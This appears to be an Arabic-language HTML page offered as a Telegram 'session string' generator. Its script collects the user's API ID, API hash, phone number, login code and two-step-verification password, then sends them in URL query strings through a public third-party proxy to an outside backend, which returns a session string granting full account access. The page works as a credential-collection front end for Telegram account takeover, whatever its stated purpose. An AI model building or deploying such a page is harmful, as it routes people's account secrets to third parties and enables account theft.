<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مستخرج سيشن تليجرام - المبرمج @rvrr4</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-color: #f8fafc;
            --border-color: #334155;
            --accent-color: #38bdf8;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            padding-top: 40px;
        }
        .tool-container { max-width: 550px; margin: 0 auto; }
        .card-custom {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        .form-control-custom {
            background-color: rgba(0, 0, 0, 0.2);
            border: 2px solid var(--border-color);
            color: var(--text-color);
            border-radius: 12px;
            padding: 12px 16px;
            transition: all 0.2s;
        }
        .form-control-custom:focus {
            background-color: rgba(0, 0, 0, 0.3);
            border-color: var(--accent-color);
            box-shadow: none;
            color: var(--text-color);
        }
        .is-invalid-custom { border-color: #dc3545 !important; }
        .error-feedback { color: #dc3545; font-size: 0.8rem; margin-top: 5px; display: none; }
        .btn-telegram {
            background-color: #0088cc;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-weight: 600;
        }
        .hidden { display: none; }
        textarea.session-output {
            font-family: 'Courier New', Courier, monospace;
            direction: ltr;
            text-align: left;
            background-color: rgba(0, 0, 0, 0.4) !important;
            color: #38bdf8 !important;
            resize: none;
        }
        .rights { font-size: 0.95rem; color: #94a3b8; text-align: center; margin-top: 20px; }
        .rights a { color: var(--accent-color); text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>

<div class="container px-4">
    <div class="tool-container">
        <div class="text-center mb-4">
            <h2 class="fw-bold m-0">مستخرج السيشن المشفرة</h2>
            <p class="text-muted small mt-2">توليد كود جلسة تليجرام (Telethon) بدون حظر المتصفح وبأعلى حماية.</p>
        </div>

        <div class="card-custom">
            <form id="session-form" onsubmit="handleSubmit(event)">
                
                <div id="step-1">
                    <div class="mb-3">
                        <label class="form-label small fw-bold">API ID</label>
                        <input type="number" name="api_id" id="api-id" class="form-control form-control-custom" placeholder="مثال: 123456" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label small fw-bold">API HASH</label>
                        <input type="text" name="api_hash" id="api-hash" class="form-control form-control-custom" placeholder="أدخل الـ Hash" required>
                    </div>
                    <div class="mb-4">
                        <label class="form-label small fw-bold">رقم الهاتف الدولي</label>
                        <input type="text" name="phone" id="phone" class="form-control form-control-custom text-start" dir="ltr" placeholder="+9665xxxxxxxx" required>
                    </div>
                    <button type="button" id="btn-send-code" onclick="sendOTP()" class="btn btn-telegram w-100">إرسال كود التحقق <i class="fa-solid fa-paper-plane ms-1"></i></button>
                </div>

                <div id="step-2" class="hidden">
                    <div class="mb-3">
                        <label class="form-label small fw-bold">كود التحقق (OTP)</label>
                        <input type="text" name="otp" id="otp-code" class="form-control form-control-custom text-center fw-bold" placeholder="أدخل كود التحقق">
                    </div>
                    <div class="mb-4 hidden" id="box-2fa">
                        <label class="form-label small fw-bold text-danger">كلمة مرور التحقق بخطوتين (2FA)</label>
                        <input type="password" name="password" id="password-2fa" class="form-control form-control-custom" placeholder="أدخل كلمة سر الحساب الإضافية">
                    </div>
                    <button type="button" id="btn-login" onclick="verifyOTP()" class="btn btn-telegram w-100">توليد السيشن الآن <i class="fa-solid fa-gears ms-1"></i></button>
                </div>

                <div id="step-3" class="hidden">
                    <h5 class="text-center fw-bold mb-3 text-success"><i class="fa-solid fa-circle-check"></i> تم التوليد بنجاح!</h5>
                    <div class="mb-3">
                        <textarea id="result-session" class="form-control form-control-custom session-output" rows="5" readonly></textarea>
                    </div>
                    <button type="button" id="btn-copy" onclick="copySession()" class="btn btn-success w-100 py-2 fw-bold">نسخ كود السيشن</button>
                </div>

            </form>

            <div id="status-message" class="mt-3 text-center small fw-bold"></div>

            <div class="rights">
                <hr class="my-4" style="border-color: var(--border-color);">
                الأداة مطورة بواسطة: <a href="https://t.me/rvrr4" target="_blank">@rvrr4</a>
            </div>
        </div>
    </div>
</div>

<script>
    // خادم بروكسي سحابي لتجاوز حظر المتصفحات للـ Fetch والـ CORS تماماً
    const PROXY_SERVER = "https://api.allorigins.win/get?url=";
    const REAL_API = "https://telegram-string-session-generator.vercel.app/api";

    let savedDetails = {};

    function handleSubmit(e) {
        e.preventDefault();
    }

    async function sendOTP() {
        const apiId = document.getElementById('api-id').value.trim();
        const apiHash = document.getElementById('api-hash').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const statusMsg = document.getElementById('status-message');

        if(!apiId || !apiHash || !phone) {
            statusMsg.innerText = "يرجى ملء كافة الحقول أولاً.";
            statusMsg.className = "mt-3 text-center small fw-bold text-danger";
            return;
        }

        savedDetails = { api_id: apiId, api_hash: apiHash, phone: phone };

        statusMsg.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> جاري طلب كود التحقق عبر البروكسي الآمن...';
        statusMsg.className = "mt-3 text-center small fw-bold text-info";

        try {
            // تغليف الطلب داخل البروكسي لتخطي عقبة الـ Failed to fetch نهائياً
            const targetUrl = encodeURIComponent(`${REAL_API}/send-otp?api_id=${apiId}&api_hash=${apiHash}&phone=${phone}`);
            const response = await fetch(`${PROXY_SERVER}${targetUrl}`);
            const outerData = await response.json();
            const data = JSON.parse(outerData.contents);

            if (data.status === "success" || data.ok) {
                document.getElementById('step-1').classList.add('hidden');
                document.getElementById('step-2').classList.remove('hidden');
                statusMsg.innerText = "تم إرسال كود التحقق بنجاح! تفقد حسابك في تليجرام.";
                statusMsg.className = "mt-3 text-center small fw-bold text-success";
            } else {
                throw new Error(data.message || "تأكد من صحة البيانات ورقم الهاتف.");
            }
        } catch (err) {
            statusMsg.innerText = "فشل طلب الكود: " + err.message;
            statusMsg.className = "mt-3 text-center small fw-bold text-danger";
        }
    }

    async function verifyOTP() {
        const otp = document.getElementById('otp-code').value.trim();
        const password = document.getElementById('password-2fa').value.trim();
        const statusMsg = document.getElementById('status-message');

        if(!otp) return;

        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin me-1"></i> جاري التحقق وإنشاء الجلسة...';
        statusMsg.className = "mt-3 text-center small fw-bold text-info";

        try {
            const targetUrl = encodeURIComponent(`${REAL_API}/verify-otp?api_id=${savedDetails.api_id}&api_hash=${savedDetails.api_hash}&phone=${savedDetails.phone}&otp=${otp}&password=${password}`);
            const response = await fetch(`${PROXY_SERVER}${targetUrl}`);
            const outerData = await response.json();
            const data = JSON.parse(outerData.contents);

            if (data.status === "success") {
                document.getElementById('step-2').classList.add('hidden');
                document.getElementById('step-3').classList.remove('hidden');
                document.getElementById('result-session').value = data.session;
                statusMsg.innerText = "";
            } else if (data.requires_password || data.status === "need_password") {
                document.getElementById('box-2fa').classList.remove('hidden');
                statusMsg.innerText = "الحساب محمي بالتحقق بخطوتين، يرجى كتابة الرمز الإضافي (2FA).";
                statusMsg.className = "mt-3 text-center small fw-bold text-warning";
            } else {
                throw new Error(data.message || "الكود غير صحيح.");
            }
        } catch (err) {
            statusMsg.innerText = "خطأ: " + err.message;
            statusMsg.className = "mt-3 text-center small fw-bold text-danger";
        }
    }

    function copySession() {
        const area = document.getElementById('result-session');
        area.select();
        document.execCommand('copy');
        document.getElementById('btn-copy').innerText = "تم النسخ بنجاح!";
    }
</script>
</body>
</html>
